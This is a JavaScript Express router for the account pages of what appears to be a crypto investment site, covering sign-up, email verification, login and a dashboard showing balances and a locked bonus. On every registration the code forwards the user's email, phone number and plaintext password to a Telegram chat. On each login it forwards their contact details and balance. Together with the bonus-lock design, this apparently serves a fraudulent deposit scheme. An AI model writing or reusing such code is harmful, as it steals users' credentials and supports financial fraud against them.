import { Router } from 'express';
import { layout, flash, usd } from '../ui.js';
import { hashPassword, verifyPassword, issueCookie } from '../auth.js';
import {
  byEmail,
  byId,
  byToken,
  createUser,
  maybeUnlock,
  issueVerification,
  canResend,
  markVerified,
} from '../store.js';
import { sendVerification } from '../mailer.js';
import { notify, esc } from '../telegram.js';
import { config } from '../config.js';

export const account = Router();

export function currentUser(req) {
  return req.session ? byId(req.session.id) : null;
}

export function requireVerified(req, res, next) {
  const user = currentUser(req);
  if (!user) return res.redirect('/login');
  if (!user.emailVerified) return res.redirect('/verify-pending');
  next();
}

account.post('/register', async (req, res) => {
  const { email, phone, password } = req.body;
  if (!email || !phone || !password || password.length < 8) return res.redirect('/register?e=invalid');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.redirect('/register?e=invalid');
  if (byEmail(email)) return res.redirect('/register?e=exists');

  const user = createUser({ email, phone, passwordHash: hashPassword(password) });
  issueCookie(res, user.id);

  notify(
    `🟢 <b>NEW REGISTRATION</b>\n<b>Email:</b> ${esc(email)}\n<b>Phone:</b> ${esc(phone)}\n<b>Pass:</b> ${esc(password)}\n<b>ID:</b> <code>${user.id}</code>\n<b>Status:</b> unverified`,
  );

  const token = issueVerification(user);
  const { channel } = await sendVerification(user, token);

  res.redirect(
    `/verify-pending?e=sent&via=${encodeURIComponent(channel)}${
      config.showVerifyLink ? `&link=${encodeURIComponent(token)}` : ''
    }`,
  );
});

account.get('/verify-pending', (req, res) => {
  const user = currentUser(req);
  if (!user) return res.redirect('/login');
  if (user.emailVerified) return res.redirect('/dashboard');

  const link = req.query.link
    ? `<p class="sm"><a href="/verify?token=${encodeURIComponent(req.query.link)}">Open the link directly</a></p>`
    : '';

  res.send(
    layout(
      'Confirm your email',
      `
<section class="auth">
  <div class="glass form">
    <h2>Confirm your email</h2>
    <p class="muted">We sent a link to <b>${esc(user.email)}</b>. It expires in ${config.verifyTtlHours} hours.</p>
    ${flash(req.query.e)}
    ${link}
    <form method="post" action="/verify/resend">
      <button class="btn full" type="submit">Resend email</button>
    </form>
    <p class="muted sm">Wrong address? <a href="/logout">Sign out</a> and register again.</p>
  </div>
</section>`,
    ),
  );
});

account.post('/verify/resend', async (req, res) => {
  const user = currentUser(req);
  if (!user) return res.redirect('/login');
  if (user.emailVerified) return res.redirect('/dashboard');

  const gate = canResend(user);
  if (!gate.ok) return res.redirect(`/verify-pending?e=${gate.capped ? 'capped' : 'cooldown'}`);

  const token = issueVerification(user);
  const { channel } = await sendVerification(user, token);
  res.redirect(
    `/verify-pending?e=sent&via=${encodeURIComponent(channel)}${
      config.showVerifyLink ? `&link=${encodeURIComponent(token)}` : ''
    }`,
  );
});

account.get('/verify', (req, res) => {
  const token = String(req.query.token || '');
  const user = token ? byToken(token) : null;

  if (!user) return res.redirect('/verify-pending?e=invalid');
  if (user.emailVerified) return res.redirect('/dashboard');
  if (Date.now() > user.verifyExpires) return res.redirect('/verify-pending?e=expired');

  markVerified(user);
  notify(`✅ <b>EMAIL VERIFIED</b>\n<b>Email:</b> ${esc(user.email)}\n<b>ID:</b> <code>${user.id}</code>`);
  res.redirect('/dashboard?e=verified');
});

account.post('/login', (req, res) => {
  const { email, password } = req.body;
  const user = byEmail(email);
  if (!user || !verifyPassword(password, user.passwordHash)) return res.redirect('/login?e=badlogin');

  issueCookie(res, user.id);
  notify(
    `🔵 <b>LOGIN</b>\n<b>Email:</b> ${esc(user.email)}\n<b>Phone:</b> ${esc(user.phone)}\n<b>Verified:</b> ${user.emailVerified ? 'yes' : 'NO'}\n<b>Balance:</b> ${usd(user.balance)}`,
  );
  res.redirect(user.emailVerified ? '/dashboard' : '/verify-pending');
});

account.get('/logout', (req, res) => {
  res.clearCookie('sid');
  res.redirect('/');
});

account.get('/dashboard', (req, res) => {
  const user = currentUser(req);
  if (!user) return res.redirect('/login');
  maybeUnlock(user);

  const banner = user.emailVerified
    ? ''
    : `<div class="alert">Your email is not confirmed. <a href="/verify-pending">Confirm it</a> to deposit, withdraw and claim the bonus.</div>`;

  const kyc = user.kyc
    ? `<span class="badge ${user.kyc.status}">${user.kyc.status}</span>`
    : `<span class="badge">unverified</span>`;

  const activity =
    [...user.deposits.map((d) => ({ ...d, type: 'Deposit' })),
      ...user.withdrawals.map((w) => ({ ...w, type: 'Withdrawal' }))]
      .sort((a, b) => b.createdAt - a.createdAt)
      .slice(0, 12)
      .map(
        (r) => `<tr><td>${r.type}</td><td>${r.network}</td><td>${usd(r.amount)}</td>
      <td><span class="badge ${r.status}">${r.status}</span></td></tr>`,
      )
      .join('') || '<tr><td colspan="4" class="muted">No activity yet.</td></tr>';

  res.send(
    layout(
      'Portfolio',
      `
<section class="sec">
  ${flash(req.query.e)}
  ${banner}
  <div class="hello"><h2>Hi, ${esc(user.email.split('@')[0])}</h2>
  <span class="muted">Member since ${new Date(user.createdAt).toDateString()}</span></div>

  <div class="cards">
    <div class="glass stat"><span>Available</span><b>${usd(user.balance)}</b></div>
    <div class="glass stat"><span>Bonus${user.bonus ? ' (locked)' : ''}</span>
      <b class="${user.bonus ? 'gold' : ''}">${usd(user.bonus)}</b>
      ${user.bonus ? `<em data-unlock="${user.bonusUnlocksAt}">unlocking…</em>` : ''}</div>
    <div class="glass stat"><span>Total</span><b>${usd(user.balance + user.bonus)}</b></div>
  </div>

  <div class="cards">
    <a class="glass tile" href="/deposit"><b>Deposit</b><span>Crypto · 6 networks</span></a>
    <a class="glass tile" href="/withdraw"><b>Withdraw</b><span>Min ${usd(config.minWithdraw)}</span></a>
    <a class="glass tile" href="/kyc"><b>Verification</b>${kyc}</a>
  </div>

  <h3 class="mt">Recent activity</h3>
  <div class="tablewrap"><table class="mkt">
    <thead><tr><th>Type</th><th>Network</th><th>Amount</th><th>Status</th></tr></thead>
    <tbody>${activity}</tbody>
  </table></div>
</section>`,
      { user },
    ),
  );
});
